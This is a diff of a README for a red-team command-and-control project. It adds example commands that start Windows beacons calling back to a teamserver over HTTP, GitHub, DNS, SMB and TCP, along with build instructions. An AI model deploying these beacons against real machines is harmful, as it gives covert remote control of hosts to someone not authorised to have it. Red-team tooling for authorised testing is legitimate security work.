@@ -2,11 +2,36 @@
 
 ## What it is
 
-Exploration is a rudimentary red team command and control frameworks.  
-This repository contain the Implant in C++ to target windows.
-This development is in education exercises to tackle well know red teaming concepts.
+Exploration is a rudimentary redteam Command and Control framework.  
+This repository contain the Beacon in C++ to target windows.  
+The TeamServer and Client can be found in [C2TeamServer](https://github.com/maxDcb/C2TeamServer).  
 
-## Dependencies:
+This project contains multiple beacon communicating with the TeamServer thought different means, here is some example:
+
+```
+# HTTP/HTTPS
+BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
+BeaconHttp.exe 10.10.10.10 8443 https
+BeaconHttp.exe 10.10.10.10 8080 http
+
+# Github
+BeaconGithub.exe user/project TOKEN
+BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...
+
+# Dns
+BeaconDns.exe DNS_SERVER DOM_TEAMSERVER
+BeaconDns.exe 8.8.8.8 bac.superdomain.com
+
+# Smb
+BeaconSmb.exe PIPE_NAME
+BeaconSmb.exe pipename2
+
+# Tcp
+BeaconTcp.exe IP_LISTENER PORT_LISTENER
+BeaconTcp.exe 127.0.0.1 4444
+```
+
+## Build 
 
 ### Sumbodule & External Projects:  
 
@@ -17,7 +42,7 @@ This development is in education exercises to tackle well know red teaming conce
 * [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
 * [json](https://github.com/nlohmann/json): json parser.
 
-### Compilation - Build the Windows Beacons and Modules
+### Build the Windows Beacons and Modules
 
 * https://chocolatey.org/install
 * choco install cmake --pre 
@@ -47,7 +72,6 @@ msbuild .\C2Implant.sln /property:Configuration=Release /p:Platform=Win32 -m
 Beacons are in: "Release\Beacons"  
 Modules DLL in: "Release\Modules"   
 
-At this point you should copy all the production: modules and beacons on you TeamServer box to be able to use it.
 
 
 
